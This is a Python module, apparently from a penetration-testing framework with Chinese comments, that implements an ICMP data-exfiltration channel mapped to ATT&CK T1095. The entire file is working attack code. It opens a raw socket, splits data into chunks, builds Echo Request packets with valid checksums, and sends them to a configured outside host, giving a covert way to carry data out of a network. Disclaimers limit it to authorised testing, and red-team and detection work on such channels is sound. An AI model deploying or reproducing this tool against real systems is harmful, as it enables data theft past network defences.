#!/usr/bin/env python3
"""
ICMP 外泄通道 - ICMP Exfiltration Channel
ATT&CK Technique: T1095 - Non-Application Layer Protocol

通过 ICMP 协议进行数据外泄
仅用于授权渗透测试和安全研究

Warning: 仅限授权渗透测试使用！
"""

import logging
import struct

from ..base import (
    BaseExfiltration,
    ExfilChannel,
    ExfilConfig,
)

logger = logging.getLogger(__name__)


class ICMPExfiltration(BaseExfiltration):
    """
    ICMP 外泄通道

    通过 ICMP Echo Request 数据包发送数据

    需要 root/管理员权限

    Warning: 仅限授权渗透测试使用！
    """

    name = "icmp_exfil"
    description = "ICMP Exfiltration Channel"
    channel = ExfilChannel.ICMP

    # ICMP Echo Request 类型
    ICMP_ECHO_REQUEST = 8
    # 最大数据负载
    MAX_PAYLOAD = 1400

    def __init__(self, config: ExfilConfig):
        super().__init__(config)
        self._socket = None
        self._seq = 0
        self._id = 0

    def connect(self) -> bool:
        """创建原始套接字"""
        try:
            import os
            import socket

            # 需要 root 权限
            if os.name != "nt" and os.geteuid() != 0:
                self.logger.error("ICMP exfiltration requires root privileges")
                return False

            # 创建原始套接字
            self._socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

            # 设置超时
            self._socket.settimeout(self.config.timeout)

            # 生成 ICMP ID
            import secrets

            self._id = secrets.randbelow(65535) + 1
            self._seq = 0

            return True

        except PermissionError:
            self.logger.error("Permission denied: root privileges required")
            return False
        except Exception as e:
            self.logger.error(f"Failed to create ICMP socket: {e}")
            return False

    def disconnect(self) -> None:
        """关闭套接字"""
        if self._socket:
            self._socket.close()
            self._socket = None

    def send_chunk(self, data: bytes) -> bool:
        """
        通过 ICMP 发送数据块

        Args:
            data: 数据块

        Returns:
            是否成功
        """
        if not self._socket:
            return False

        try:
            # 分割数据以适应 ICMP 负载大小
            for i in range(0, len(data), self.MAX_PAYLOAD):
                chunk = data[i : i + self.MAX_PAYLOAD]

                # 构建 ICMP 包
                packet = self._build_icmp_packet(chunk)

                # 发送
                self._socket.sendto(packet, (self.config.destination, 0))
                self._seq += 1

            return True

        except Exception as e:
            self.logger.error(f"ICMP send failed: {e}")
            return False

    def _build_icmp_packet(self, payload: bytes) -> bytes:
        """
        构建 ICMP Echo Request 包

        Args:
            payload: 数据负载

        Returns:
            完整的 ICMP 包
        """
        # ICMP 头部: type(1) + code(1) + checksum(2) + id(2) + seq(2)
        icmp_type = self.ICMP_ECHO_REQUEST
        icmp_code = 0
        checksum = 0
        icmp_id = self._id
        icmp_seq = self._seq

        # 构建头部（校验和暂时为0）
        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, icmp_seq)

        # 计算校验和
        checksum = self._calculate_checksum(header + payload)

        # 重新构建带正确校验和的头部
        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, icmp_seq)

        return header + payload

    def _calculate_checksum(self, data: bytes) -> int:
        """
        计算 ICMP 校验和

        Args:
            data: 要计算校验和的数据

        Returns:
            校验和值
        """
        # 补齐为偶数长度
        if len(data) % 2:
            data += b"\x00"

        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            checksum += word

        # 折叠高16位到低16位
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += checksum >> 16

        # 取反
        return ~checksum & 0xFFFF


__all__ = ["ICMPExfiltration"]
